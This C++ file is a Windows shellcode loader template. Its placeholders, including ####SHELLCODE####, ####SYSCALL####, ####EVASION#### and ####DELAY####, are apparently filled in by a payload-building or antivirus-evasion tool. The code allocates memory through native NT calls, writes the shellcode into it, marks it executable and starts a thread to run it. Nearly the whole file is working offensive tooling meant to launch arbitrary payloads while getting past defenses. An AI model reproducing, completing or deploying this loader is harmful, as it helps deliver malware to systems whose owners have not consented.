#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>

//####INCLUDE####

//####DEFINE####

//####CODE####


DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    unsigned char encoded[] = ####SHELLCODE####;
    SIZE_T length = sizeof(encoded);


    //####CALL####
    unsigned char* decoded = encoded;


    //####SYSCALL####
    HANDLE hProc = NULL;
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE hThread = NULL;
    SIZE_T bytesWritten;
    SIZE_T pnew = length;
    

    //####INJECTION####

    // Allocate memory for shellcode
    NTSTATUS status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Write shellcode to allocated memory
    status = NtWriteVirtualMemory(hProc, base_addr, decoded, length, 0);

    // Change memory protection to executable
    status = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&length, PAGE_EXECUTE_READ, &oldprotect);

    // Create a new thread to execute the shellcode
    status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProc, base_addr, base_addr, 0, NULL, NULL, NULL, NULL);

    // Wait for thread to complete
    status = NtWaitForSingleObject(hThread, FALSE, NULL);

    // Clean up handles
    NtClose(hThread);
    NtClose(hProc);
    
    return 0;
}

int main()
{
    //####DELAY####
    //####EVASION####
    //####ARGS####

    esc_main(NULL);
}
